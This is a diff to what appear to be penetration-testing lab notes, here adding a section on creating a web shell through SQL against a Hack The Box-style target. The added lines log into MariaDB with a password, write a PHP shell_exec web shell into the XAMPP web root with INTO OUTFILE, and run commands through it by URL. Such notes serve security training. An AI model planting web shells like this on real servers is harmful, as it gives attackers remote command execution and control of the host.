@@ -357,7 +357,16 @@ Some services they determine rate limitation for bruteforcing, that's why we hav
 -w 5 = wait 5 seconds between each attempt
 Slows it down so it looks like a normal user, not a bot. 
 _________________________________________________________________________________________________________________________________________________________________________________________________
+Create web shell in SQL
+------------------------
 
+# mysql -h $target -u fiona -p987654321 --ssl=FALSE
+
+# MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\test2.php';
+
+Execute in browser
+
+http://inlanefreight.htb/test2.php?c=dir%20C:\Users\Administrator\Desktop
 
 
 
